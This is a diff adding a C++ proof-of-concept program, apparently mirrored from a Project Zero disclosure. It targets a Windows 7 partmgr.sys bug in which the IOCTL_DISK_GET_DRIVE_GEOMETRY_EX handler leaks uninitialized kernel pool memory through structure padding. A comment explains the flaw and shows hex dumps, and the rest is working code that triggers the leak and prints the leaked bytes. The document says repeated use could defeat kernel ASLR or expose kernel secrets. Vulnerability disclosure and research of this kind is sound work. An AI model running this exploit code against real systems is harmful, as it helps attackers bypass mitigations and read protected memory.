@@ -1,0 +1,92 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1156&desc=2
+
+We have discovered that the handler of the IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL in partmgr.sys discloses portions of uninitialized pool memory to user-mode clients, due to output structure alignment holes.
+
+On our test Windows 7 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 ff ff 00 00 00 00 00 00 00 00 00 00 ff ff ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: bf 0c 00 00 00 00 00 00 0c 00 00 00 ff 00 00 00 ................
+00000010: 3f 00 00 00 00 02 00 00 00 00 00 40 06 00 00 00 ?..........@....
+00000020: 18 00 00 00 00 00 00 00 ee a2 5d 9f 00 00 00 00 ..........].....
+00000030: 00 00 00 00 00 00 00 00 38 00 00 00 01 00 00 00 ........8.......
+00000040: 80 00[c1 c1]ff 03 00 00 3f 00 fe 00 01 00[c1 c1]........?.......
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Open the disk device.
+  HANDLE hDisk = CreateFile(L"\\\\.\\C:",
+                            0,
+                            0,
+                            NULL,
+                            OPEN_EXISTING,
+                            FILE_ATTRIBUTE_NORMAL,
+                            NULL);
+  if (hDisk == INVALID_HANDLE_VALUE) {
+    printf("CreateFile failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Obtain the output data, assuming that it will fit into 1024 bytes.
+  BYTE geometry[1024];
+  DWORD BytesReturned;
+  if (!DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &geometry, sizeof(geometry), &BytesReturned, NULL)) {
+    printf("DeviceIoControl failed, %d\n", GetLastError());
+    CloseHandle(hDisk);
+    return 1;
+  }
+
+  // Dump the output data on screen and free resources.
+  PrintHex(geometry, BytesReturned);
+  CloseHandle(hDisk);
+
+  return 0;
+}
